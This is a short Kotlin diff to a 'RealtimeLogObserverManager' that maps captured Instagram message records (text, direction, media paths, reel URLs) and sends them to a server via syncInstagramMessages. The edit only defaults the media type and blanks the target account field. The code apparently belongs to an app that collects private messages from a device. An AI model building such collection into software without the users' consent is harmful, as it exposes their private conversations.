@@ -390,10 +390,10 @@ object RealtimeLogObserverManager {
                             messageText = it.messageText,
                             isOutgoing = it.isOutgoing,
                             messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                            mediaType = it.mediaType,
+                            mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else "text"),
                             mediaPath = it.mediaPath,
                             reelUrl = it.reelUrl,
-                            targetAccount = it.targetAccount
+                            targetAccount = null
                         )
                     }
                     val response = ApiClient.service.syncInstagramMessages(
